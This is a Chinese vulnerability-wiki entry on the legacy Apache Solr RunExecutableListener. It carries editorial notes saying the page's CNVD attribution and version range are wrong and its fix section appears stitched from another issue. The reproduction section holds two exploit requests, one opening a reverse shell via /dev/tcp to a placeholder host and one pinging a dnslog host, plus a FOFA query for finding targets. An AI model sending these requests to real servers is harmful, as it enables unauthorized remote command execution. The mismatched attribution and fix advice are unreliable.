---
cnvd: "CNVD-2023-27598"
source: "Threekiii/Vulnerability-Wiki"
title: "Apache Solr RunExecutableListener 历史请求（原 CNVD 归属不适用）"
product: "Apache Solr RunExecutableListener（历史组件）"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: "CNVD-2023-27598"
identifier_role: "reference"
prerequisites: "目标须实际包含旧 RunExecutableListener 且允许相应配置操作；认证、触发和受影响版本未确认"
verification_source: "https://solr.apache.org/guide/solr/latest/configuration-guide/commits-transaction-logs.html"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
id: "vw-d3241469e334f70b48267d3e"
entity_id: "ve-d3241469e334f70b48267d3e"
schema_version: "1"
version_unverified: "原文 8.10.0 <= Apache Solr < 9.2.0 与已移除的 RunExecutableListener 不适用"
---

# Apache Solr RunExecutableListener 历史请求（原 CNVD 归属不适用）

<!-- vulwiki-editorial:start -->
## 校订与适用边界

本文按现有两份 RunExecutableListener 配置请求保留历史技术资料。官方文档说明该组件自 Solr 7.1 移除，因此后文 8.10–9.2 的版本说明及 CNVD-2023-27598 归属不能用于这些请求；原编号仅作错配线索，不进入主编号索引。ConfigSets 修复建议也不能代替该旧组件的适用条件。

- 适用前提：声称SolrCloud8.10.0–<9.2.0且可出网；所贴代码却依赖已移除的RunExecutableListener
- 证据范围：描述/影响版本/PoC三者不对应。两请求是旧12629监听器方法，不能验证所述2023漏洞。

### 已有来源支持的更正

- 官方明确RunExecutableListener自7.1移除

### 本次正文校订

- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 高优先级错PoC：官方明确RunExecutableListener在7.1已移除，与8.10–9.2范围直接冲突
- 未展示实际Cloud配置/SSRF或新版本利用链
- 修复段ConfigSet UPLOAD建议与正文监听器无关联，疑多源拼接
- postCommit缺触发步骤且无结果，不能称已复现

### 核验来源

- https://solr.apache.org/guide/solr/latest/configuration-guide/commits-transaction-logs.html

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

Solr 以 Solrcloud 模式启动且可出网时，未经身份验证的远程攻击者可以通过发送特制的数据包进行利用，最终在目标系统上远程执行任意代码。

## 漏洞影响

```
8.10.0 <= Apache Solr < 9.2.0
```

## 网络测绘

```
app="APACHE-Solr"
```

## 漏洞复现

使用postCommit来命令执行

```http
POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 180
Content-Type: application/json

{"add-listener":{"event":"postCommit","name":"suiyi","class":"solr.RunExecutableListener","exe":"bash","dir":"/bin/","args":["-c", "bash -i >& /dev/tcp/your-ip/9999 0>&1"]}}
```

通过newSearcher命令执行

```http
POST /solr/demo/config HTTP/1.1
Host: 192.168.1.92:8983
Content-Length: 170
Content-Type: application/json

{"add-listener":{"event":"newSearcher","name":"newSearcher3","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping -c 3 your-dnslog.dnslog.cn"]}}
```

## 漏洞修复

1. 如果未使用 ConfigSets API，请禁用 UPLOAD 命令，将系统属性：configset.upload.enabled 设置为 false ，详细参考：https://lucene.apache.org/solr/guide/8_6/configsets-api.html
2. 使用身份验证/授权，详细参考：https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html
3. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本：
   https://github.com/apache/solr/releases/tag/releases/solr/9.2.0


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
